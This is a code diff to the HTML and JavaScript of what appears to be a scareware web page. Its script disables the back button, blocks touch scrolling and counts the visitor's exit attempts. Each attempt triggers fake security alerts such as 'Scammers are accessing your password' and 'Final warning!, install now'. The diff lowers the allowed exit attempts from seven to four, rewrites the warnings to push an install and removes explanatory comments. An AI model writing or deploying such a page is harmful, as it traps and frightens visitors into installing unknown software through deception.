@@ -56,7 +56,6 @@
       margin-top: 15px;
     }
 
-    /* Hidden countdown element */
     #exitAttempts {
       display: none;
     }
@@ -88,30 +87,25 @@
 
   <script>
     let attempts = 0;
-    const maxAttempts = 7;
+    const maxAttempts = 4;
     const exitAttemptsText = document.getElementById('exitAttempts');
 
-    // Disable back button
     history.pushState(null, null, location.href);
     window.onpopstate = function(event) {
       history.go(1);
       handleExitAttempt();
     };
 
-    // Handle exit attempts
     function handleExitAttempt() {
       attempts++;
       exitAttemptsText.textContent = `Warning: ${attempts}/${maxAttempts} attempts to exit`;
 
       if (attempts < maxAttempts) {
         const warnings = [
-          "Your data is still at risk!",
-          "Scammers are accessing your photos!",
-          "Bank accounts is visible!",
+          "Scammers are accessing your password, take action now",
           "Last chance to protect yourself!",
-          "Security breach detected!",
-          "Critical danger!",
-          "Final warning!"
+          "Your device is still at risk",
+          "Final warning!, install now"
         ];
 
         alert(`⚠️ ${warnings[attempts - 1]}`);
@@ -139,7 +133,6 @@
       }
     }
 
-    // Prevent touch scrolling
     document.addEventListener('touchmove', function(e) {
       e.preventDefault();
     }, { passive: false });
